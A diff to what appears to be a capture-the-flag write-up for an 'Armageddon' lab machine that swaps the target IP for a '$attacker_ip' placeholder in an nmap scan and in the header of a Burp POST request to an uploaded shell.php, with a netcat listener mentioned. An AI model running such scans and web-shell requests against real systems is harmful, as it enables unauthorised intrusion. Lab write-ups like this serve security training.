@@ -21,10 +21,10 @@ We run our classic `nmap` scan :
 sudo nmap -sC -sV -oA scans\armageddon
 ```
 ```text
-sudo nmap -sC -sV -oA scans/nmap 10.129.127.84
+sudo nmap -sC -sV -oA scans/nmap $attacker_ip
  
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 08:51 CEST
-Nmap scan report for 10.129.127.84
+Nmap scan report for $attacker_ip
 Host is up (0.025s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -77,7 +77,7 @@ Let's fire up `Burp`, with the following request and a `nc listener` :
 
 ```text
 POST /shell.php HTTP/1.1
-Host: 10.129.127.84
+Host: $attacker_ip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
